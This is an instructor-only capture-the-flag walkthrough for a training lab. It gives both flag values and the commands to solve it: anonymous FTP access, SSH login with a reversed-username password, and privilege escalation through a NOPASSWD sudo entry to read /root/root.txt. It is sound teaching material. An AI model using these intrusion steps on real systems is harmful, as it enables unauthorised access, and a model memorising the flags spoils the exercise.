# Week 8 CTF Walkthrough — INSTRUCTOR ONLY

> **Do not distribute to students before the end of the session.**

---

## Flag 1 — user.txt (`flag{w8_foothold_via_ssh}`)

**Step 1 — Connect to FTP anonymously:**
```bash
ftp <target_ftp_ip>
# Username: anonymous  Password: (blank)
ftp> ls
ftp> get user.txt
ftp> bye
cat user.txt
```

The file is planted at `/var/ftp/pub/user.txt` (copied from `./ftp-data/` via docker-compose volume).

---

## Flag 2 — root.txt (`flag{w8_root_privesc_complete}`)

**Step 1 — Derive credentials:**
- Username: `aadams`
- Password: `smadaa` (username reversed — classic De-ICE challenge pattern)

**Step 2 — SSH in:**
```bash
ssh aadams@<target_ssh_ip> -p 2222
# Password: smadaa
```

**Step 3 — Check sudo permissions:**
```bash
sudo -l
# Output: (ALL) NOPASSWD: /bin/cat
```

**Step 4 — Read root flag via sudo:**
```bash
sudo cat /root/root.txt
```

---

## Teaching Points

- Anonymous FTP is a Tier-1 finding; always check for files left in pub directories
- Password derivation from usernames (reversed, l33t-speak, appended numbers) is covered in rockyou but also in manual analysis
- `sudo -l` is the first command to run after gaining SSH access — NOPASSWD entries are instant privilege escalation paths
- This mirrors the original De-ICE pentest scenario where credential derivation unlocked root access
